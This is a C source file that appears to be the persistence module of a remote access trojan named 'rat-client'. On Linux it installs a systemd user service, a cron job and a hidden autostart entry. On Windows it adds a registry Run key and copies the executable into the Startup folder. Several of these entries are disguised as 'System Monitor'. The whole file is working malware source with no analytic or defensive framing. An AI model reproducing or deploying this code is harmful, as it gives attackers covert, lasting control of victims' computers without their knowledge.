#define _GNU_SOURCE
#define _POSIX_C_SOURCE 200809L

#include "../include/persistence.h"

// Linux systemd service persistence
int install_systemd_service(const char *executable_path) {
#ifdef _WIN32
    return -1; // Not supported on Windows
#else
    char service_content[2048];
    char service_path[512];
    char *home_dir = get_home_directory();
    FILE *service_file;
    
    if (!executable_path || strlen(executable_path) == 0) {
        return -1;
    }
    
    if (!home_dir) {
        return -1;
    }
    
    // Create systemd user directory if it doesn't exist
    int ret = snprintf(service_path, sizeof(service_path), "%s/.config/systemd/user", home_dir);
    if (ret >= (int)sizeof(service_path) || ret < 0) {
        free(home_dir);
        return -1;
    }
    
    if (mkdir(service_path, 0755) != 0 && errno != EEXIST) {
        free(home_dir);
        return -1;
    }
    
    // Create service file path
    ret = snprintf(service_path, sizeof(service_path), "%s/.config/systemd/user/rat-client.service", home_dir);
    if (ret >= (int)sizeof(service_path) || ret < 0) {
        free(home_dir);
        return -1;
    }
    
    // Get username safely
    const char *username = getlogin();
    if (!username) {
        struct passwd *pw = getpwuid(getuid());
        username = pw ? pw->pw_name : "unknown";
    }
    
    // Create service file content
    ret = snprintf(service_content, sizeof(service_content),
        "[Unit]\n"
        "Description=RAT Client Service\n"
        "After=network.target\n"
        "\n"
        "[Service]\n"
        "Type=simple\n"
        "ExecStart=%s\n"
        "Restart=always\n"
        "RestartSec=10\n"
        "User=%s\n"
        "\n"
        "[Install]\n"
        "WantedBy=default.target\n",
        executable_path, username);
    
    if (ret >= (int)sizeof(service_content) || ret < 0) {
        free(home_dir);
        return -1;
    }
    
    // Write service file
    service_file = fopen(service_path, "w");
    if (!service_file) {
        free(home_dir);
        return -1;
    }
    
    size_t content_len = strlen(service_content);
    size_t written = fwrite(service_content, 1, content_len, service_file);
    int close_result = fclose(service_file);
    
    if (written != content_len || close_result != 0) {
        unlink(service_path); // Remove partially written file
        free(home_dir);
        return -1;
    }
    
    // Enable and start the service
    char command[1024];
    ret = snprintf(command, sizeof(command), 
        "systemctl --user daemon-reload 2>/dev/null && "
        "systemctl --user enable rat-client.service 2>/dev/null && "
        "systemctl --user start rat-client.service 2>/dev/null");
    
    if (ret >= (int)sizeof(command) || ret < 0) {
        free(home_dir);
        return -1;
    }
    
    int system_result = system(command);
    
    free(home_dir);
    return (system_result == 0) ? 0 : -1;
#endif
}

// Linux cron job persistence
int install_cron_job(const char *executable_path) {
#ifdef _WIN32
    return -1; // Not supported on Windows
#else
    char cron_entry[512];
    char command[1024];
    FILE *crontab_file;
    
    // Create temporary file using mkstemp to avoid symlink race
    char temp_template[] = "/tmp/rat_cron_XXXXXX";
    int temp_fd = mkstemp(temp_template);
    if (temp_fd == -1) {
        return -1;
    }
    crontab_file = fdopen(temp_fd, "w");
    if (!crontab_file) {
        close(temp_fd);
        unlink(temp_template);
        return -1;
    }
    
    // Add cron entry to run every 5 minutes
    snprintf(cron_entry, sizeof(cron_entry), "*/5 * * * * %s\n", executable_path);
    fprintf(crontab_file, "%s", cron_entry);
    fclose(crontab_file);
    
    // Get existing crontab and append new entry
    snprintf(command, sizeof(command), "crontab -l 2>/dev/null >> %s || true", temp_template);
    system(command);
    
    // Install the new crontab
    snprintf(command, sizeof(command), "crontab %s", temp_template);
    int result = system(command);
    
    // Clean up temporary file
    unlink(temp_template);
    
    return (result == 0) ? 0 : -1;
#endif
}

// Linux autostart persistence
int install_autostart_entry(const char *executable_path) {
#ifdef _WIN32
    return -1; // Not supported on Windows
#else
    char autostart_content[1024];
    char autostart_path[512];
    char *home_dir = get_home_directory();
    FILE *desktop_file;
    
    if (!executable_path || strlen(executable_path) == 0) {
        return -1;
    }
    
    if (!home_dir) {
        return -1;
    }
    
    // Create autostart directory if it doesn't exist
    int ret = snprintf(autostart_path, sizeof(autostart_path), "%s/.config/autostart", home_dir);
    if (ret >= (int)sizeof(autostart_path) || ret < 0) {
        free(home_dir);
        return -1;
    }
    
    if (mkdir(autostart_path, 0755) != 0 && errno != EEXIST) {
        free(home_dir);
        return -1;
    }
    
    // Create desktop file path
    ret = snprintf(autostart_path, sizeof(autostart_path), "%s/.config/autostart/rat-client.desktop", home_dir);
    if (ret >= (int)sizeof(autostart_path) || ret < 0) {
        free(home_dir);
        return -1;
    }
    
    // Create desktop file content
    ret = snprintf(autostart_content, sizeof(autostart_content),
        "[Desktop Entry]\n"
        "Type=Application\n"
        "Name=System Monitor\n"
        "Comment=System monitoring service\n"
        "Exec=%s\n"
        "Hidden=false\n"
        "NoDisplay=true\n"
        "X-GNOME-Autostart-enabled=true\n",
        executable_path);
    
    if (ret >= (int)sizeof(autostart_content) || ret < 0) {
        free(home_dir);
        return -1;
    }
    
    // Write desktop file
    desktop_file = fopen(autostart_path, "w");
    if (!desktop_file) {
        free(home_dir);
        return -1;
    }
    
    size_t content_len = strlen(autostart_content);
    size_t written = fwrite(autostart_content, 1, content_len, desktop_file);
    int close_result = fclose(desktop_file);
    
    if (written != content_len || close_result != 0) {
        unlink(autostart_path); // Remove partially written file
        free(home_dir);
        return -1;
    }
    
    // Make it executable
    if (chmod(autostart_path, 0755) != 0) {
        unlink(autostart_path); // Remove file if chmod failed
        free(home_dir);
        return -1;
    }
    
    free(home_dir);
    return 0;
#endif
}

// Windows registry persistence
#ifdef _WIN32
int install_registry_run(const char *executable_path) {
    HKEY hKey;
    LONG result;
    
    // Open the Run key in HKEY_CURRENT_USER
    result = RegOpenKeyEx(HKEY_CURRENT_USER, 
                         "Software\\Microsoft\\Windows\\CurrentVersion\\Run",
                         0, KEY_SET_VALUE, &hKey);
    
    if (result != ERROR_SUCCESS) {
        return -1;
    }
    
    // Set the registry value
    result = RegSetValueEx(hKey, "SystemMonitor", 0, REG_SZ, 
                          (BYTE*)executable_path, strlen(executable_path) + 1);
    
    RegCloseKey(hKey);
    
    return (result == ERROR_SUCCESS) ? 0 : -1;
}

int install_startup_folder(const char *executable_path) {
    char startup_path[MAX_PATH];
    char dest_path[MAX_PATH];
    
    // Get the startup folder path
    if (SHGetFolderPath(NULL, CSIDL_STARTUP, NULL, SHGFP_TYPE_CURRENT, startup_path) != S_OK) {
        return -1;
    }
    
    // Create destination path
    snprintf(dest_path, sizeof(dest_path), "%s\\SystemMonitor.exe", startup_path);
    
    // Copy the executable to startup folder
    if (!CopyFile(executable_path, dest_path, FALSE)) {
        return -1;
    }
    
    return 0;
}
#endif

// Remove persistence functions
int remove_systemd_service(void) {
#ifdef _WIN32
    return -1;
#else
    char service_path[512];
    char *home_dir = get_home_directory();
    char command[1024];
    
    if (!home_dir) {
        return -1;
    }
    
    // Stop and disable service
    snprintf(command, sizeof(command), "systemctl --user stop rat-client.service 2>/dev/null && systemctl --user disable rat-client.service 2>/dev/null");
    int result = system(command);
    
    // Remove service file
    snprintf(service_path, sizeof(service_path), "%s/.config/systemd/user/rat-client.service", home_dir);
    if (unlink(service_path) != 0 && result == 0) {
        result = -1;
    }
    
    // Reload daemon
    system("systemctl --user daemon-reload 2>/dev/null");
    
    free(home_dir);
    return result;
#endif
}

int remove_cron_job(void) {
#ifdef _WIN32
    return -1;
#else
    char command[1024];
    
    // Create temp file with mkstemp to avoid symlink race
    char temp_template[] = "/tmp/rat_cron_clean_XXXXXX";
    int temp_fd = mkstemp(temp_template);
    if (temp_fd == -1) {
        return -1;
    }
    close(temp_fd);
    
    // Get current crontab without our entry
    snprintf(command, sizeof(command), "crontab -l 2>/dev/null | grep -v 'rat\\|client' > %s || true", temp_template);
    system(command);
    
    // Install cleaned crontab
    snprintf(command, sizeof(command), "crontab %s", temp_template);
    int result = system(command);
    
    // Clean up
    unlink(temp_template);
    
    return (result == 0) ? 0 : -1;
#endif
}

int remove_autostart_entry(void) {
#ifdef _WIN32
    return -1;
#else
    char autostart_path[512];
    char *home_dir = get_home_directory();
    
    if (!home_dir) {
        return -1;
    }
    
    snprintf(autostart_path, sizeof(autostart_path), "%s/.config/autostart/rat-client.desktop", home_dir);
    int result = unlink(autostart_path);
    
    free(home_dir);
    return (result == 0) ? 0 : -1;
#endif
}

#ifdef _WIN32
int remove_registry_run(void) {
    HKEY hKey;
    LONG result;
    
    result = RegOpenKeyEx(HKEY_CURRENT_USER, 
                         "Software\\Microsoft\\Windows\\CurrentVersion\\Run",
                         0, KEY_SET_VALUE, &hKey);
    
    if (result != ERROR_SUCCESS) {
        return -1;
    }
    
    result = RegDeleteValue(hKey, "SystemMonitor");
    RegCloseKey(hKey);
    
    return (result == ERROR_SUCCESS) ? 0 : -1;
}

int remove_startup_folder(void) {
    char startup_path[MAX_PATH];
    char file_path[MAX_PATH];
    
    if (SHGetFolderPath(NULL, CSIDL_STARTUP, NULL, SHGFP_TYPE_CURRENT, startup_path) != S_OK) {
        return -1;
    }
    
    snprintf(file_path, sizeof(file_path), "%s\\SystemMonitor.exe", startup_path);
    
    return DeleteFile(file_path) ? 0 : -1;
}
#endif

// Universal persistence functions
int install_persistence(PersistenceMethod method, const char *executable_path) {
    switch (method) {
        case PERSISTENCE_SYSTEMD:
            return install_systemd_service(executable_path);
        case PERSISTENCE_CRON:
            return install_cron_job(executable_path);
        case PERSISTENCE_AUTOSTART:
            return install_autostart_entry(executable_path);
#ifdef _WIN32
        case PERSISTENCE_REGISTRY:
            return install_registry_run(executable_path);
        case PERSISTENCE_STARTUP_FOLDER:
            return install_startup_folder(executable_path);
#endif
        default:
            return -1;
    }
}

int remove_persistence(PersistenceMethod method) {
    switch (method) {
        case PERSISTENCE_SYSTEMD:
            return remove_systemd_service();
        case PERSISTENCE_CRON:
            return remove_cron_job();
        case PERSISTENCE_AUTOSTART:
            return remove_autostart_entry();
#ifdef _WIN32
        case PERSISTENCE_REGISTRY:
            return remove_registry_run();
        case PERSISTENCE_STARTUP_FOLDER:
            return remove_startup_folder();
#endif
        default:
            return -1;
    }
}

int check_persistence_status(PersistenceMethod method) {
    switch (method) {
        case PERSISTENCE_SYSTEMD: {
#ifdef _WIN32
            return 0;
#else
            char *home_dir = get_home_directory();
            char service_path[512];
            if (!home_dir) return 0;
            snprintf(service_path, sizeof(service_path), "%s/.config/systemd/user/rat-client.service", home_dir);
            int exists = file_exists(service_path);
            free(home_dir);
            return exists;
#endif
        }
        case PERSISTENCE_CRON: {
#ifdef _WIN32
            return 0;
#else
            // Check if our cron entry exists
            FILE *fp = popen("crontab -l 2>/dev/null | grep -q 'rat'", "r");
            if (!fp) return 0;
            int found = pclose(fp);
            return (found == 0) ? 1 : 0;
#endif
        }
        case PERSISTENCE_AUTOSTART: {
#ifdef _WIN32
            return 0;
#else
            char *home_dir = get_home_directory();
            char autostart_path[512];
            if (!home_dir) return 0;
            snprintf(autostart_path, sizeof(autostart_path), "%s/.config/autostart/rat-client.desktop", home_dir);
            int exists = file_exists(autostart_path);
            free(home_dir);
            return exists;
#endif
        }
#ifdef _WIN32
        case PERSISTENCE_REGISTRY: {
            HKEY hKey;
            LONG result = RegOpenKeyEx(HKEY_CURRENT_USER, 
                                     "Software\\Microsoft\\Windows\\CurrentVersion\\Run",
                                     0, KEY_READ, &hKey);
            if (result != ERROR_SUCCESS) return 0;
            
            result = RegQueryValueEx(hKey, "SystemMonitor", NULL, NULL, NULL, NULL);
            RegCloseKey(hKey);
            return (result == ERROR_SUCCESS) ? 1 : 0;
        }
        case PERSISTENCE_STARTUP_FOLDER: {
            char startup_path[MAX_PATH];
            char file_path[MAX_PATH];
            if (SHGetFolderPath(NULL, CSIDL_STARTUP, NULL, SHGFP_TYPE_CURRENT, startup_path) != S_OK) {
                return 0;
            }
            snprintf(file_path, sizeof(file_path), "%s\\SystemMonitor.exe", startup_path);
            return file_exists(file_path);
        }
#endif
        default:
            return 0;
    }
}

const char* get_persistence_method_name(PersistenceMethod method) {
    switch (method) {
        case PERSISTENCE_SYSTEMD: return "systemd";
        case PERSISTENCE_CRON: return "cron";
        case PERSISTENCE_AUTOSTART: return "autostart";
        case PERSISTENCE_REGISTRY: return "registry";
        case PERSISTENCE_STARTUP_FOLDER: return "startup_folder";
        default: return "unknown";
    }
}

// Utility functions
int copy_file(const char *src, const char *dest) {
    FILE *source, *destination;
    char buffer[4096];
    size_t bytes;
    
    if (!src || !dest) {
        return -1;
    }
    
    if (strlen(src) == 0 || strlen(dest) == 0) {
        return -1;
    }
    
    source = fopen(src, "rb");
    if (!source) {
        return -1;
    }
    
    destination = fopen(dest, "wb");
    if (!destination) {
        fclose(source);
        return -1;
    }
    
    while ((bytes = fread(buffer, 1, sizeof(buffer), source)) > 0) {
        size_t written = fwrite(buffer, 1, bytes, destination);
        if (written != bytes) {
            fclose(source);
            fclose(destination);
            unlink(dest); // Remove partially written file
            return -1;
        }
    }
    
    // Check for read errors
    if (ferror(source)) {
        fclose(source);
        fclose(destination);
        unlink(dest); // Remove partially written file
        return -1;
    }
    
    int close_src = fclose(source);
    int close_dest = fclose(destination);
    
    if (close_src != 0 || close_dest != 0) {
        unlink(dest); // Remove file if close failed
        return -1;
    }
    
    return 0;
}

int file_exists(const char *path) {
    struct stat st;
    return (stat(path, &st) == 0);
}

char* get_executable_path(void) {
#ifdef _WIN32
    char *path = malloc(MAX_PATH);
    if (!path) {
        return NULL;
    }
    
    DWORD result = GetModuleFileName(NULL, path, MAX_PATH);
    if (result > 0 && result < MAX_PATH) {
        return path;
    }
    
    free(path);
    return NULL;
#else
    char *path = malloc(PATH_MAX);
    if (!path) {
        return NULL;
    }
    
    ssize_t len = readlink("/proc/self/exe", path, PATH_MAX - 1);
    if (len > 0 && len < PATH_MAX - 1) {
        path[len] = '\0';
        return path;
    }
    
    free(path);
    return NULL;
#endif
}

char* get_home_directory(void) {
#ifdef _WIN32
    char *home = malloc(MAX_PATH);
    if (!home) {
        return NULL;
    }
    
    HRESULT result = SHGetFolderPath(NULL, CSIDL_PROFILE, NULL, SHGFP_TYPE_CURRENT, home);
    if (result == S_OK) {
        return home;
    }
    
    free(home);
    return NULL;
#else
    struct passwd *pw = getpwuid(getuid());
    if (pw && pw->pw_dir) {
        size_t len = strlen(pw->pw_dir);
        char *home = malloc(len + 1);
        if (home) {
            strcpy(home, pw->pw_dir);
            return home;
        }
    }
    return NULL;
#endif
}

// Automatic persistence functions
int install_automatic_persistence(void) {
    // Check if any persistence is already installed
    if (!is_persistence_needed()) {
        return 0; // Already persistent, no need to install
    }
    
    char *executable_path = get_executable_path();
    if (!executable_path) {
        return -1; // Cannot determine executable path
    }
    
    int success = 0;
    
#ifdef _WIN32
    // Try Windows methods in order of preference
    
    // 1. Try registry method first (most reliable)
    if (install_persistence(PERSISTENCE_REGISTRY, executable_path) == 0) {
        success = 1;
    }
    // 2. Try startup folder as backup
    else if (install_persistence(PERSISTENCE_STARTUP_FOLDER, executable_path) == 0) {
        success = 1;
    }
    
#else
    // Try Linux methods in order of preference
    
    // 1. Try autostart first (works on most desktop environments)
    if (install_persistence(PERSISTENCE_AUTOSTART, executable_path) == 0) {
        success = 1;
    }
    // 2. Try systemd as backup (if available)
    else if (install_persistence(PERSISTENCE_SYSTEMD, executable_path) == 0) {
        success = 1;
    }
    // 3. Try cron as last resort
    else if (install_persistence(PERSISTENCE_CRON, executable_path) == 0) {
        success = 1;
    }
    
#endif
    
    free(executable_path);
    return success ? 0 : -1;
}

int is_persistence_needed(void) {
    // Check if any persistence method is already active
    
#ifdef _WIN32
    // Check Windows methods
    if (check_persistence_status(PERSISTENCE_REGISTRY)) {
        return 0; // Registry persistence active
    }
    if (check_persistence_status(PERSISTENCE_STARTUP_FOLDER)) {
        return 0; // Startup folder persistence active
    }
#else
    // Check Linux methods
    if (check_persistence_status(PERSISTENCE_SYSTEMD)) {
        return 0; // systemd persistence active
    }
    if (check_persistence_status(PERSISTENCE_AUTOSTART)) {
        return 0; // Autostart persistence active
    }
    if (check_persistence_status(PERSISTENCE_CRON)) {
        return 0; // Cron persistence active
    }
#endif
    
    return 1; // No persistence found, installation needed
}